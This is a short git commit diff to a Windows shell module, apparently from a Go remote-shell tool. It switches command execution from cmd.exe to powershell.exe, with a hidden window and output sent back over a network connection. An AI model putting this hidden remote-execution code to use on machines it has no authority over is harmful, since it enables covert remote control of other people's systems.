136dc584ea97e870d9d12b85dd286b742fd94cae
Ronan Kervella <1799430+lesnuages@users.noreply.github.com>
2018-02-25 00:28:09 +0100

    switched to powershell for code execution

--- shell/shell_windows.go
+++ shell/shell_windows.go
@@ -17,14 +17,16 @@ const (
 )
 
 func GetShell() *exec.Cmd {
-	cmd := exec.Command("C:\\Windows\\System32\\cmd.exe")
+	//cmd := exec.Command("C:\\Windows\\System32\\cmd.exe")
+	cmd := exec.Command("powershell.exe")
 	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
 	return cmd
 }
 
 func ExecuteCmd(command string, conn net.Conn) {
-	cmd_path := "C:\\Windows\\System32\\cmd.exe"
-	cmd := exec.Command(cmd_path, "/c", command+"\n")
+	//cmd_path := "C:\\Windows\\System32\\cmd.exe"
+	cmd_path := "powershell.exe"
+	cmd := exec.Command(cmd_path, "-c", command+"\n")
 	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
 	cmd.Stdout = conn
 	cmd.Stderr = conn
